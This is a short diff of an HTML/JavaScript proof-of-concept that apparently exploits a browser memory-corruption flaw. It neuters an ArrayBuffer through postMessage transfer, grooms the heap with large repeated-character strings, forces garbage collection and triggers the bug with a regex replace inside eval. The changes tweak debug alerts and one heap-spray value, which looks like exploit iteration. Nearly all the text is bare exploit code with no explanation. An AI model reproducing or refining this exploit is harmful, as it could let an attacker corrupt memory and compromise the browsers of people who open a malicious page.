@@ -1,5 +1,5 @@
 <script>
-alert("start_to_read2");
+alert("start_to_read3");
 var array=new Array(0x4000);
 function neuter(ab) {
     postMessage("", "*", [ab]);
@@ -29,7 +29,7 @@ var mystr1=createStringWithRepeatedChar("M",(1<<16));
 var mystr2=createStringWithRepeatedChar("N",(1<<16));
 
 for(var i=0;i<0x14;i++){
-tmp+="\u0000\u0000";
+tmp+="\u0000\u63a8";
 }
 for(var i=0;i<0x28;i++){
 tmp+="\u0000";
@@ -57,7 +57,8 @@ function myfunc(){
 //alert("to trigger");
 gc();
 eval("x.replace(/\\d/g, y)");
-//alert(mystr2.charCodeAt(0).toString(16));
+alert("ok");
+alert(mystr2.charCodeAt(0).toString(16));
 alert("end");
 }
 setTimeout(myfunc,6000);
